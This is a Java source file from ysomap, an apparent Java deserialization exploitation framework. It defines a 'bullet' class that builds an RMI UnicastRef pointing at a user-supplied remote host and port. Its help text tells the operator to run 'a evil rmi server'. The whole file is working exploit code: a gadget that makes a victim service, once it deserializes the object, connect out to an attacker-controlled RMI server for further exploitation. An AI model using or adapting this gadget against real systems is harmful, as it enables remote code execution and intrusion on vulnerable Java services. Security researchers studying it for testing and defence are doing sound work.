package ysomap.core.bullet.jdk.rmi;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;

import java.rmi.server.ObjID;
import java.util.Random;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@Bullets
@Dependencies({"*"})
@Authors({ Authors.WH1T3P1G })
public class RMIConnectBullet extends Bullet<Object> {

    @Require(name = "rhost", detail = "Remote RMI Server Host to Connect, plz running a evil rmi server")
    public String rhost;
    @Require(name = "rport", type = "int", detail = "Remote RMI Server Port, Default 1099")
    public String rport = "1099";

    @Override
    public Object getObject() throws Exception {
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(rhost, Integer.parseInt(rport));
        return new UnicastRef(new LiveRef(id, te, false));
    }
}
